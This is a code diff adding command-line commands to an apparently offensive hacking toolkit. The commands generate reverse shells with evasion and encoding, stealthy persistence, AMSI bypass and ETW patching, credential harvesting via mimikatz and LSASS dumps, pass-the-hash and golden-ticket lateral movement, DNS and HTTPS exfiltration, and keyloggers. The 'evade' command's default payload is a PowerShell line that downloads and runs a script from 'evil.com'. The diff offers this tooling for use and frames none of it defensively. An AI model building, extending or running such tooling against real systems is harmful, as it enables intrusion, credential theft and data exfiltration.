@@ -3025,5 +3025,602 @@ def mitre_map(
         raise typer.Exit(1)
 
 
+@app.command()
+def advanced_shell(
+    lhost: str = typer.Argument(..., help="Attacker IP address (LHOST)"),
+    lport: int = typer.Option(4444, "--port", "-p", help="Listener port (LPORT)"),
+    protocol: str = typer.Option("bash_tcp", "--protocol", "-P", help="Shell protocol: bash_tcp, python_tcp, powershell_tcp, dns_tunnel, icmp_shell, websocket, smb_pipe, http2, ssl_encrypted, socat_encrypted"),
+    platform: str = typer.Option("linux", "--platform", "-os", help="Target platform: windows, linux, macos"),
+    encoding: str = typer.Option("none", "--encoding", "-e", help="Payload encoding: none, base64, hex, xor, gzip_base64"),
+    all_shells: bool = typer.Option(False, "--all", "-a", help="Generate all available shells for platform"),
+    output: Optional[str] = typer.Option(None, "--output", "-o", help="Save JSON report"),
+):
+    """
+    Generate advanced multi-protocol reverse shells.
+    Supports DNS tunneling, ICMP shells, WebSocket, SMB pipes, HTTP/2, SSL encrypted shells.
+    """
+    async def run():
+        from .advanced_shells import AdvancedShellGenerator, ShellProtocol, ShellEncoding
+        
+        try:
+            console.print(f"\n[cyan]🐚 Advanced Shell Generator[/cyan]\n")
+            console.print(f"[dim]LHOST: {lhost} | LPORT: {lport} | Platform: {platform}[/dim]\n")
+            
+            generator = AdvancedShellGenerator(lhost=lhost, lport=lport)
+            
+            if all_shells:
+                # Generate all shells for platform
+                shells = await generator.generate_all_shells(platform=platform, encoding=ShellEncoding(encoding))
+                
+                console.print(f"[green]✅ Generated {len(shells)} shells for {platform}:[/green]\n")
+                
+                for shell in shells:
+                    console.print(Panel.fit(
+                        f"[bold cyan]{shell.protocol.value}[/bold cyan]\n\n"
+                        f"[yellow]Description:[/yellow] {shell.description}\n\n"
+                        f"[yellow]Payload:[/yellow]\n[white]{shell.payload}[/white]\n\n"
+                        f"[yellow]Listener:[/yellow]\n[white]{shell.listener_command}[/white]\n\n"
+                        f"[dim]Evasion: {', '.join(shell.evasion_features)}[/dim]",
+                        title=f"[bold]{shell.protocol.value.upper()}[/bold]",
+                        border_style="cyan"
+                    ))
+                
+                # Save to file
+                if output:
+                    with open(output, "w") as f:
+                        json.dump([s.to_dict() for s in shells], f, indent=2)
+                    console.print(f"\n[green]✅ Shells saved to: {output}[/green]")
+                
+            else:
+                # Generate single shell
+                shell = await generator.generate_shell(
+                    protocol=ShellProtocol(protocol),
+                    platform=platform,
+                    encoding=ShellEncoding(encoding),
+                    evasion=True
+                )
+                
+                console.print(Panel.fit(
+                    f"[bold cyan]{shell.protocol.value}[/bold cyan]\n\n"
+                    f"[yellow]Description:[/yellow] {shell.description}\n\n"
+                    f"[yellow]Payload:[/yellow]\n[white]{shell.payload}[/white]\n\n"
+                    f"[yellow]Listener Command:[/yellow]\n[white]{shell.listener_command}[/white]\n\n"
+                    f"[yellow]Evasion Features:[/yellow] {', '.join(shell.evasion_features)}\n"
+                    f"[yellow]Port:[/yellow] {shell.port}",
+                    title=f"[bold]{protocol.upper()} Shell[/bold]",
+                    border_style="cyan"
+                ))
+                
+                # Show TTY upgrade commands
+                if platform == "linux":
+                    tty_commands = generator.get_tty_upgrade_commands("linux")
+                    console.print("\n[yellow]📟 TTY Upgrade Commands:[/yellow]")
+                    for method, cmd in list(tty_commands.items())[:3]:
+                        console.print(f"  [cyan]{method}:[/cyan] {cmd}")
+                
+                if output:
+                    with open(output, "w") as f:
+                        json.dump(shell.to_dict(), f, indent=2)
+                    console.print(f"\n[green]✅ Shell saved to: {output}[/green]")
+            
+        except Exception as e:
+            console.print(f"[red]Error generating shell: {e}[/red]")
+            import traceback
+            console.print(f"[dim]{traceback.format_exc()}[/dim]")
+            raise typer.Exit(1)
+    
+    asyncio.run(run())
+
+
+@app.command()
+def privesc(
+    platform: str = typer.Option("linux", "--platform", "-p", help="Target platform: windows, linux"),
+    output: Optional[str] = typer.Option(None, "--output", "-o", help="Save JSON report"),
+):
+    """
+    Scan for privilege escalation opportunities.
+    Detects kernel exploits, SUID binaries, sudo misconfigurations, and Windows token issues.
+    """
+    async def run():
+        from .privilege_escalation import PrivilegeEscalationScanner
+        
+        try:
+            console.print(f"\n[cyan]⬆️ Privilege Escalation Scanner[/cyan]\n")
+            console.print(f"[dim]Platform: {platform}[/dim]\n")
+            
+            scanner = PrivilegeEscalationScanner()
+            
+            if platform == "linux":
+                vectors = await scanner.scan_linux()
+            elif platform == "windows":
+                vectors = await scanner.scan_windows()
+            else:
+                console.print(f"[red]Unsupported platform: {platform}[/red]")
+                raise typer.Exit(1)
+            
+            report = await scanner.generate_report(vectors)
+            
+            # Display summary
+            console.print(Panel.fit(
+                f"[bold green]Found {report['total_vectors']} escalation vectors[/bold green]\n\n"
+                f"[red]Critical:[/red] {report['severity_breakdown']['critical']}\n"
+                f"[yellow]High:[/yellow] {report['severity_breakdown']['high']}\n"
+                f"[cyan]Medium:[/cyan] {report['severity_breakdown']['medium']}\n"
+                f"[dim]Low:[/dim] {report['severity_breakdown']['low']}",
+                title="[bold]Privilege Escalation Summary[/bold]",
+                border_style="green"
+            ))
+            
+            # Display top recommendations
+            console.print("\n[bold yellow]🎯 Top 5 Escalation Vectors:[/bold yellow]\n")
+            for i, vec in enumerate(report['top_recommendations'][:5], 1):
+                console.print(Panel.fit(
+                    f"[yellow]Target:[/yellow] {vec['target']}\n"
+                    f"[yellow]Technique:[/yellow] {vec['technique']}\n"
+                    f"[yellow]Description:[/yellow] {vec['description']}\n\n"
+                    f"[yellow]Exploitation:[/yellow]\n[white]{vec['exploitation_command']}[/white]\n\n"
+                    f"[yellow]Success Probability:[/yellow] {vec['success_probability']}%",
+                    title=f"[bold]{i}. {vec['severity'].upper()}[/bold]",
+                    border_style="red" if vec['severity'] == "critical" else "yellow"
+                ))
+            
+            # Save report
+            if output:
+                with open(output, "w") as f:
+                    json.dump(report, f, indent=2)
+                console.print(f"\n[green]✅ Report saved to: {output}[/green]")
+            
+        except Exception as e:
+            console.print(f"[red]Error scanning for privilege escalation: {e}[/red]")
+            import traceback
+            console.print(f"[dim]{traceback.format_exc()}[/dim]")
+            raise typer.Exit(1)
+    
+    asyncio.run(run())
+
+
+@app.command()
+def persist(
+    payload: str = typer.Argument(..., help="Payload command to persist"),
+    platform: str = typer.Option("windows", "--platform", "-p", help="Target platform: windows, linux"),
+    technique: str = typer.Option("registry_run", "--technique", "-t", help="Persistence technique"),
+    stealth: bool = typer.Option(True, "--stealth", "-s", help="Use stealthy techniques"),
+    all_techniques: bool = typer.Option(False, "--all", "-a", help="Show all persistence techniques"),
+    output: Optional[str] = typer.Option(None, "--output", "-o", help="Save JSON report"),
+):
+    """
+    Generate persistence mechanisms for maintaining access.
+    Windows: Registry, scheduled tasks, services, WMI events.
+    Linux: Cron jobs, systemd services, SSH keys, bashrc.
+    """
+    async def run():
+        from .persistence import PersistenceManager, PersistenceTechnique
+        
+        try:
+            console.print(f"\n[cyan]🔒 Persistence Mechanism Generator[/cyan]\n")
+            console.print(f"[dim]Platform: {platform} | Stealth: {stealth}[/dim]\n")
+            
+            manager = PersistenceManager(payload=payload)
+            
+            if all_techniques:
+                # Generate all persistence mechanisms
+                mechanisms = await manager.generate_all_mechanisms(os_type=platform, stealth=stealth)
+                
+                console.print(f"[green]✅ Generated {len(mechanisms)} persistence mechanisms:[/green]\n")
+                
+                for mech in mechanisms:
+                    console.print(Panel.fit(
+                        f"[bold cyan]{mech.technique.value}[/bold cyan]\n\n"
+                        f"[yellow]Description:[/yellow] {mech.description}\n\n"
+                        f"[yellow]Trigger:[/yellow] {mech.trigger}\n"
+                        f"[yellow]Stealth Level:[/yellow] {mech.stealth_level}\n"
+                        f"[yellow]Requires Admin:[/yellow] {mech.requires_admin}\n"
+                        f"[yellow]MITRE:[/yellow] {mech.mitre_technique}\n\n"
+                        f"[yellow]Installation:[/yellow]\n[white]{mech.persistence_command}[/white]\n\n"
+                        f"[yellow]Removal:[/yellow]\n[white]{mech.removal_command}[/white]",
+                        title=f"[bold]{mech.technique.value.upper()}[/bold]",
+                        border_style="green"
+                    ))
+                
+                if output:
+                    with open(output, "w") as f:
+                        json.dump([m.to_dict() for m in mechanisms], f, indent=2)
+                    console.print(f"\n[green]✅ Mechanisms saved to: {output}[/green]")
+            
+            else:
+                # Generate single persistence mechanism
+                if platform == "windows":
+                    mechanism = await manager.generate_windows_persistence(
+                        technique=PersistenceTechnique(technique),
+                        stealth=stealth
+                    )
+                else:
+                    mechanism = await manager.generate_linux_persistence(
+                        technique=PersistenceTechnique(technique),
+                        stealth=stealth
+                    )
+                
+                console.print(Panel.fit(
+                    f"[bold cyan]{mechanism.technique.value}[/bold cyan]\n\n"
+                    f"[yellow]Description:[/yellow] {mechanism.description}\n\n"
+                    f"[yellow]Trigger:[/yellow] {mechanism.trigger}\n"
+                    f"[yellow]Stealth Level:[/yellow] {mechanism.stealth_level}\n"
+                    f"[yellow]Detection Difficulty:[/yellow] {mechanism.detection_difficulty}\n"
+                    f"[yellow]Requires Admin:[/yellow] {mechanism.requires_admin}\n"
+                    f"[yellow]MITRE:[/yellow] {mechanism.mitre_technique}\n\n"
+                    f"[yellow]Installation Command:[/yellow]\n[white]{mechanism.persistence_command}[/white]\n\n"
+                    f"[yellow]Removal Command:[/yellow]\n[white]{mechanism.removal_command}[/white]",
+                    title=f"[bold]{technique.upper()} Persistence[/bold]",
+                    border_style="green"
+                ))
+                
+                if output:
+                    with open(output, "w") as f:
+                        json.dump(mechanism.to_dict(), f, indent=2)
+                    console.print(f"\n[green]✅ Mechanism saved to: {output}[/green]")
+            
+        except Exception as e:
+            console.print(f"[red]Error generating persistence: {e}[/red]")
+            import traceback
+            console.print(f"[dim]{traceback.format_exc()}[/dim]")
+            raise typer.Exit(1)
+    
+    asyncio.run(run())
+
+
+@app.command()
+def evade(
+    technique: str = typer.Option("amsi_bypass", "--technique", "-t", help="Evasion technique: amsi_bypass, etw_patching, process_injection, obfuscation, sandbox_detection"),
+    payload: str = typer.Option("IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')", "--payload", "-p", help="Payload to obfuscate/evade"),
+    all_techniques: bool = typer.Option(False, "--all", "-a", help="Show all evasion techniques"),
+    output: Optional[str] = typer.Option(None, "--output", "-o", help="Save JSON report"),
+):
+    """
+    Generate defense evasion payloads.
+    AMSI bypass, ETW patching, process injection, obfuscation, sandbox detection.
+    """
+    async def run():
+        from .evasion import DefenseEvasionGenerator, EvasionTechnique
+        
+        try:
+            console.print(f"\n[cyan]🛡️ Defense Evasion Generator[/cyan]\n")
+            
+            generator = DefenseEvasionGenerator()
+            
+            if all_techniques:
+                # Generate all evasion techniques
+                techniques = await generator.generate_all_techniques("windows")
+                
+                console.print(f"[green]✅ Generated {len(techniques)} evasion techniques:[/green]\n")
+                
+                for tech in techniques:
+                    console.print(Panel.fit(
+                        f"[bold cyan]{tech.technique.value}[/bold cyan]\n\n"
+                        f"[yellow]Description:[/yellow] {tech.description}\n\n"
+                        f"[yellow]Language:[/yellow] {tech.language}\n"
+                        f"[yellow]Success Rate:[/yellow] {tech.success_rate}%\n"
+                        f"[yellow]Detection Rate:[/yellow] {tech.detection_rate}\n"
+                        f"[yellow]MITRE:[/yellow] {tech.mitre_technique}\n\n"
+                        f"[yellow]Code:[/yellow]\n[white]{tech.code[:500]}...[/white]",
+                        title=f"[bold]{tech.technique.value.upper()}[/bold]",
+                        border_style="cyan"
+                    ))
+                
+                if output:
+                    with open(output, "w") as f:
+                        json.dump([t.to_dict() for t in techniques], f, indent=2)
+                    console.print(f"\n[green]✅ Techniques saved to: {output}[/green]")
+            
+            else:
+                # Generate single evasion technique
+                if technique == "amsi_bypass":
+                    evasion = await generator.generate_amsi_bypass(variant=1)
+                elif technique == "etw_patching":
+                    evasion = await generator.generate_etw_patch()
+                elif technique == "process_injection":
+                    evasion = await generator.generate_process_injection("classic")
+                elif technique == "obfuscation":
+                    evasion = await generator.generate_obfuscation(payload, "base64")
+                elif technique == "sandbox_detection":
+                    evasion = await generator.generate_sandbox_detection()
+                else:
+                    console.print(f"[red]Unknown technique: {technique}[/red]")
+                    raise typer.Exit(1)
+                
+                console.print(Panel.fit(
+                    f"[bold cyan]{evasion.technique.value}[/bold cyan]\n\n"
+                    f"[yellow]Description:[/yellow] {evasion.description}\n\n"
+                    f"[yellow]Language:[/yellow] {evasion.language}\n"
+                    f"[yellow]Success Rate:[/yellow] {evasion.success_rate}%\n"
+                    f"[yellow]Detection Rate:[/yellow] {evasion.detection_rate}\n"
+                    f"[yellow]Requires Admin:[/yellow] {evasion.requires_admin}\n"
+                    f"[yellow]MITRE:[/yellow] {evasion.mitre_technique}\n\n"
+                    f"[yellow]Code:[/yellow]\n[white]{evasion.code}[/white]",
+                    title=f"[bold]{technique.upper()}[/bold]",
+                    border_style="cyan"
+                ))
+                
+                if output:
+                    with open(output, "w") as f:
+                        json.dump(evasion.to_dict(), f, indent=2)
+                    console.print(f"\n[green]✅ Evasion saved to: {output}[/green]")
+            
+        except Exception as e:
+            console.print(f"[red]Error generating evasion: {e}[/red]")
+            import traceback
+            console.print(f"[dim]{traceback.format_exc()}[/dim]")
+            raise typer.Exit(1)
+    
+    asyncio.run(run())
+
+
+@app.command()
+def harvest_creds(
+    platform: str = typer.Option("windows", "--platform", "-p", help="Target platform: windows, linux, multi"),
+    source: str = typer.Option("mimikatz", "--source", "-s", help="Credential source: mimikatz, lsass_dump, ntds_dit, browser_chrome, etc."),
+    all_sources: bool = typer.Option(False, "--all", "-a", help="Show all credential harvesting techniques"),
+    output: Optional[str] = typer.Option(None, "--output", "-o", help="Save JSON report"),
+):
+    """
+    Generate credential harvesting commands.
+    Mimikatz, LSASS dumping, NTDS.dit, browser passwords, KeePass, WiFi passwords.
+    """
+    async def run():
+        from .credential_harvesting import CredentialHarvester, CredentialSource
+        
+        try:
+            console.print(f"\n[cyan]🔐 Credential Harvesting Generator[/cyan]\n")
+            console.print(f"[dim]Platform: {platform}[/dim]\n")
+            
+            harvester = CredentialHarvester()
+            
+            if all_sources:
+                # Generate all harvesting techniques
+                techniques = await harvester.generate_all_techniques(platform)
+                
+                report = await harvester.generate_report(techniques)
+                
+                console.print(f"[green]✅ Generated {report['total_techniques']} harvesting techniques:[/green]\n")
+                console.print(f"[yellow]Windows:[/yellow] {report['by_platform']['windows']}")
+                console.print(f"[yellow]Linux:[/yellow] {report['by_platform']['linux']}")
+                console.print(f"[yellow]Requires Admin:[/yellow] {report['requires_admin']}\n")
+                
+                for tech in techniques[:5]:  # Show first 5
+                    console.print(Panel.fit(
+                        f"[bold cyan]{tech.source.value}[/bold cyan]\n\n"
+                        f"[yellow]Description:[/yellow] {tech.description}\n\n"
+                        f"[yellow]Requires Admin:[/yellow] {tech.requires_admin}\n"
+                        f"[yellow]Detection Risk:[/yellow] {tech.detection_risk}\n"
+                        f"[yellow]MITRE:[/yellow] {tech.mitre_technique}\n\n"
+                        f"[yellow]Commands:[/yellow]\n[white]{chr(10).join(tech.commands[:10])}[/white]",
+                        title=f"[bold]{tech.source.value.upper()}[/bold]",
+                        border_style="green"
+                    ))
+                
+                if output:
+                    with open(output, "w") as f:
+                        json.dump(report, f, indent=2)
+                    console.print(f"\n[green]✅ Report saved to: {output}[/green]")
+            
+            else:
+                # Generate single harvesting technique
+                if source == "mimikatz":
+                    technique = await harvester.generate_mimikatz_commands()
+                elif source == "lsass_dump":
+                    technique = await harvester.generate_lsass_dump()
+                elif source == "ntds_dit":
+                    technique = await harvester.generate_ntds_extraction()
+                elif source == "browser_chrome":
+                    technique = await harvester.generate_browser_chrome()
+                elif source == "linux_shadow":
+                    technique = await harvester.generate_linux_shadow()
+                elif source == "ssh_keys":
+                    technique = await harvester.generate_ssh_keys()
+                else:
+                    console.print(f"[red]Unknown source: {source}[/red]")
+                    raise typer.Exit(1)
+                
+                console.print(Panel.fit(
+                    f"[bold cyan]{technique.source.value}[/bold cyan]\n\n"
+                    f"[yellow]Description:[/yellow] {technique.description}\n\n"
+                    f"[yellow]Platform:[/yellow] {technique.platform}\n"
+                    f"[yellow]Requires Admin:[/yellow] {technique.requires_admin}\n"
+                    f"[yellow]Detection Risk:[/yellow] {technique.detection_risk}\n"
+                    f"[yellow]MITRE:[/yellow] {technique.mitre_technique}\n\n"
+                    f"[yellow]Commands:[/yellow]\n[white]{chr(10).join(technique.commands)}[/white]",
+                    title=f"[bold]{source.upper()}[/bold]",
+                    border_style="green"
+                ))
+                
+                if output:
+                    with open(output, "w") as f:
+                        json.dump(technique.to_dict(), f, indent=2)
+                    console.print(f"\n[green]✅ Technique saved to: {output}[/green]")
+            
+        except Exception as e:
+            console.print(f"[red]Error generating credential harvesting: {e}[/red]")
+            import traceback
+            console.print(f"[dim]{traceback.format_exc()}[/dim]")
+            raise typer.Exit(1)
+    
+    asyncio.run(run())
+
+
+@app.command()
+def lateral_move(
+    technique: str = typer.Option("pass_the_hash", "--technique", "-t", help="Lateral movement technique: pass_the_hash, pass_the_ticket, golden_ticket, psexec, wmiexec, etc."),
+    all_techniques: bool = typer.Option(False, "--all", "-a", help="Show all lateral movement techniques"),
+    output: Optional[str] = typer.Option(None, "--output", "-o", help="Save JSON report"),
+):
+    """
+    Generate lateral movement commands.
+    Pass-the-Hash, Golden Ticket, Kerberoasting, PSExec, WMI, RDP hijacking.
+    """
+    async def run():
+        from .lateral_movement import LateralMovementGenerator, LateralTechnique
+        
+        try:
+            console.print(f"\n[cyan]↔️ Lateral Movement Generator[/cyan]\n")
+            
+            generator = LateralMovementGenerator()
+            
+            if all_techniques:
+                # Generate all lateral movement techniques
+                techniques = await generator.generate_all_techniques("multi")
+                
+                console.print(f"[green]✅ Generated {len(techniques)} lateral movement techniques:[/green]\n")
+                
+                for tech in techniques[:5]:  # Show first 5
+                    console.print(Panel.fit(
+                        f"[bold cyan]{tech.technique.value}[/bold cyan]\n\n"
+                        f"[yellow]Description:[/yellow] {tech.description}\n\n"
+                        f"[yellow]Platform:[/yellow] {tech.platform}\n"
+                        f"[yellow]Requires Credentials:[/yellow] {tech.requires_credentials}\n"
+                        f"[yellow]Requires Admin:[/yellow] {tech.requires_admin}\n"
+                        f"[yellow]Stealth Level:[/yellow] {tech.stealth_level}\n"
+                        f"[yellow]MITRE:[/yellow] {tech.mitre_technique}\n\n"
+                        f"[yellow]Commands:[/yellow]\n[white]{chr(10).join(tech.commands[:15])}[/white]",
+                        title=f"[bold]{tech.technique.value.upper()}[/bold]",
+                        border_style="cyan"
+                    ))
+                
+                if output:
+                    with open(output, "w") as f:
+                        json.dump([t.to_dict() for t in techniques], f, indent=2)
+                    console.print(f"\n[green]✅ Techniques saved to: {output}[/green]")
+            
+            else:
+                # Generate single lateral movement technique
+                if technique == "pass_the_hash":
+                    payload = await generator.generate_pass_the_hash()
+                elif technique == "pass_the_ticket":
+                    payload = await generator.generate_pass_the_ticket()
+                elif technique == "golden_ticket":
+                    payload = await generator.generate_golden_ticket()
+                elif technique == "kerberoasting":
+                    payload = await generator.generate_kerberoasting()
+                elif technique == "psexec":
+                    payload = await generator.generate_psexec()
+                elif technique == "wmiexec":
+                    payload = await generator.generate_wmiexec()
+                else:
+                    console.print(f"[red]Unknown technique: {technique}[/red]")
+                    raise typer.Exit(1)
+                
+                console.print(Panel.fit(
+                    f"[bold cyan]{payload.technique.value}[/bold cyan]\n\n"
+                    f"[yellow]Description:[/yellow] {payload.description}\n\n"
+                    f"[yellow]Platform:[/yellow] {payload.platform}\n"
+                    f"[yellow]Requires Credentials:[/yellow] {payload.requires_credentials}\n"
+                    f"[yellow]Requires Admin:[/yellow] {payload.requires_admin}\n"
+                    f"[yellow]Stealth Level:[/yellow] {payload.stealth_level}\n"
+                    f"[yellow]MITRE:[/yellow] {payload.mitre_technique}\n\n"
+                    f"[yellow]Commands:[/yellow]\n[white]{chr(10).join(payload.commands)}[/white]",
+                    title=f"[bold]{technique.upper()}[/bold]",
+                    border_style="cyan"
+                ))
+                
+                if output:
+                    with open(output, "w") as f:
+                        json.dump(payload.to_dict(), f, indent=2)
+                    console.print(f"\n[green]✅ Payload saved to: {output}[/green]")
+            
+        except Exception as e:
+            console.print(f"[red]Error generating lateral movement: {e}[/red]")
+            import traceback
+            console.print(f"[dim]{traceback.format_exc()}[/dim]")
+            raise typer.Exit(1)
+    
+    asyncio.run(run())
+
+
+@app.command()
+def post_exploit(
+    technique: str = typer.Option("system_enumeration", "--technique", "-t", help="Post-exploitation technique: system_enumeration, network_pivoting, data_exfil_dns, data_exfil_https, screenshot, keylogger"),
+    all_techniques: bool = typer.Option(False, "--all", "-a", help="Show all post-exploitation techniques"),
+    output: Optional[str] = typer.Option(None, "--output", "-o", help="Save JSON report"),
+):
+    """
+    Generate post-exploitation commands.
+    System enumeration, network pivoting, data exfiltration, screenshots, keyloggers.
+    """
+    async def run():
+        from .post_exploitation import PostExploitationGenerator, PostExploitTechnique
+        
+        try:
+            console.print(f"\n[cyan]🎯 Post-Exploitation Generator[/cyan]\n")
+            
+            generator = PostExploitationGenerator()
+            
+            if all_techniques:
+                # Generate all post-exploitation techniques
+                techniques = await generator.generate_all_techniques("multi")
+                
+                console.print(f"[green]✅ Generated {len(techniques)} post-exploitation techniques:[/green]\n")
+                
+                for tech in techniques:
+                    console.print(Panel.fit(
+                        f"[bold cyan]{tech.technique.value}[/bold cyan]\n\n"
+                        f"[yellow]Description:[/yellow] {tech.description}\n\n"
+                        f"[yellow]Platform:[/yellow] {tech.platform}\n"
+                        f"[yellow]Requires Admin:[/yellow] {tech.requires_admin}\n"
+                        f"[yellow]Stealth Level:[/yellow] {tech.stealth_level}\n"
+                        f"[yellow]MITRE:[/yellow] {tech.mitre_technique}\n"
+                        f"[yellow]Tools Required:[/yellow] {', '.join(tech.tools_required) if tech.tools_required else 'None'}\n\n"
+                        f"[yellow]Commands:[/yellow]\n[white]{chr(10).join(tech.commands[:20])}...[/white]",
+                        title=f"[bold]{tech.technique.value.upper()}[/bold]",
+                        border_style="green"
+                    ))
+                
+                if output:
+                    with open(output, "w") as f:
+                        json.dump([t.to_dict() for t in techniques], f, indent=2)
+                    console.print(f"\n[green]✅ Techniques saved to: {output}[/green]")
+            
+            else:
+                # Generate single post-exploitation technique
+                if technique == "system_enumeration":
+                    payload = await generator.generate_system_enumeration()
+                elif technique == "network_pivoting":
+                    payload = await generator.generate_network_pivoting()
+                elif technique == "data_exfil_dns":
+                    payload = await generator.generate_data_exfil_dns()
+                elif technique == "data_exfil_https":
+                    payload = await generator.generate_data_exfil_https()
+                elif technique == "screenshot":
+                    payload = await generator.generate_screenshot_capture()
+                elif technique == "keylogger":
+                    payload = await generator.generate_keylogger()
+                else:
+                    console.print(f"[red]Unknown technique: {technique}[/red]")
+                    raise typer.Exit(1)
+                
+                console.print(Panel.fit(
+                    f"[bold cyan]{payload.technique.value}[/bold cyan]\n\n"
+                    f"[yellow]Description:[/yellow] {payload.description}\n\n"
+                    f"[yellow]Platform:[/yellow] {payload.platform}\n"
+                    f"[yellow]Requires Admin:[/yellow] {payload.requires_admin}\n"
+                    f"[yellow]Stealth Level:[/yellow] {payload.stealth_level}\n"
+                    f"[yellow]MITRE:[/yellow] {payload.mitre_technique}\n"
+                    f"[yellow]Tools Required:[/yellow] {', '.join(payload.tools_required) if payload.tools_required else 'None'}\n\n"
+                    f"[yellow]Commands:[/yellow]\n[white]{chr(10).join(payload.commands)}[/white]",
+                    title=f"[bold]{technique.upper()}[/bold]",
+                    border_style="green"
+                ))
+                
+                if output:
+                    with open(output, "w") as f:
+                        json.dump(payload.to_dict(), f, indent=2)
+                    console.print(f"\n[green]✅ Payload saved to: {output}[/green]")
+            
+        except Exception as e:
+            console.print(f"[red]Error generating post-exploitation: {e}[/red]")
+            import traceback
+            console.print(f"[dim]{traceback.format_exc()}[/dim]")
+            raise typer.Exit(1)
+    
+    asyncio.run(run())
+
+
 if __name__ == "__main__":
     app()
